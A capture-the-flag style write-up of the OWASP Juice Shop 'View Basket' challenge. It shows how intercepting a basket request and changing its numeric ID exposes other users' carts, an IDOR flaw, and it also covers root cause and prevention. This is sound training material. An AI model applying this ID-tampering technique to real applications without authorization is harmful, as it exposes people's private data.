# OWASP Juice Shop – View Basket

## Category

**Broken Access Control**

### Challenge Name

**View Basket**

### Difficulty

**2 Star**

## Objective

- View another user's shopping basket.

## Description

- This challenge demonstrates an **IDOR (Insecure Direct Object Reference)** vulnerability where basket identifiers can be changed to access another user's cart data.

## Vulnerable Endpoint

```text id="p4t8xn"
/rest/basket/{id}
````

or

```text
/api/Basket/{id}
```

(Version may vary)


## Vulnerability Type

### Broken Access Control / IDOR

The application trusts the basket ID supplied by the user without verifying ownership.

## Step-by-Step Solution

### Step 1: Login to Any Account

Use any normal user account.

### Step 2: Open Your Basket

Go to cart page and intercept request in Burp Suite.

Example:

```http
GET /rest/basket/6 HTTP/1.1
Host: 192.168.1.122:3000
Authorization: Bearer <token>
```

### Step 3: Change Basket ID

Modify the basket number to another value:

```http
GET /rest/basket/1 HTTP/1.1
Host: 192.168.1.122:3000
Authorization: Bearer <token>
```

Try IDs like:

```text
1
2
3
4
5
```

### Step 4: Forward Request

If another user's basket is returned, the challenge is solved.

## Example Successful Response

```json
{
  "id": 1,
  "Products": [...]
}
```

## Why It Works

The backend checks only whether the user is logged in, but does **not** verify whether the basket belongs to that user.

## Impact

- View another user's cart contents
    
- Privacy breach
    
- Business intelligence leakage
    
- Potential price/cart manipulation in weak systems

## Severity

**High**

## Root Cause

- Missing object-level authorization
    
- Predictable numeric IDs
    
- No ownership validation

## Prevention

- Enforce server-side ownership checks
    
- Use indirect/random identifiers
    
- Return 403 for unauthorized objects
    
- Test for IDOR in APIs

## OWASP Mapping

- A01: Broken Access Control

## Key Lesson

- Authentication alone is not enough.  
- Every object request must verify authorization.

## Conclusion

- This challenge shows how changing a simple basket ID can expose another user's shopping cart.